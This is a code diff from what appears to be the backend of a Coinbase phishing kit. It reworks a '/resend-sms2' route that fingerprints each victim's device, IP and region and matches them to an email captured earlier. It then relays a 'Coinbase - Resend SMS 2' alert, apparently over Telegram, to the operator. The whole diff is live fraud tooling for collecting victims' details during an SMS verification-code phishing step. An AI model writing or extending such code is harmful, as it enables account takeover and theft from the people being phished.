@@ -845,40 +845,33 @@ app.post("/resend-sms2", async (req, res) => {
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
     const fingerprint = getDeviceFingerprint(req);
+    const ipPrefix = ip.split(".").slice(0, 3).join(".");
 
-    // ✅ Find the winner's email (original email that set winner in page 1)
-    let winnerEmail = null;
+    // ✅ Get email from tracking (same way digits do)
+    let email = "unknown@example.com";
     
-    // Search through all winners to find one with this fingerprint
-    for (const [email, winner] of Object.entries(userWinnerTelegram)) {
-      if (typeof email === 'string' && email !== 'undefined') {
-        // Check if this email's fingerprint matches
-        if (pendingPage[email]) {
-          winnerEmail = email;
-          break;
-        }
-      }
+    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+      email = deviceFingerprintToEmail[fingerprint];
+      console.log(`✅ Found email via fingerprint: ${email}`);
+    } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
+      email = ipPrefixToEmail[ipPrefix];
+      console.log(`✅ Found email via IP: ${email}`);
     }
-
-    if (!winnerEmail) {
-      console.log(`❌ No winner found`);
-      return res.status(400).json({ error: "No winner found" });
-    }
-
-    console.log(`✅ Found winner: ${winnerEmail}`);
 
     const message =
       `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${winnerEmail}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
-    await sendFollowUpMessage(winnerEmail, message, {
+    // ✅ Use sendFollowUpMessage - it handles finding the winner!
+    await sendFollowUpMessage(email, message, {
       parse_mode: "HTML"
     });
 
+    console.log(`✅ Resend message sent to ${email}`);
     res.json({ ok: true });
 
   } catch (err) {
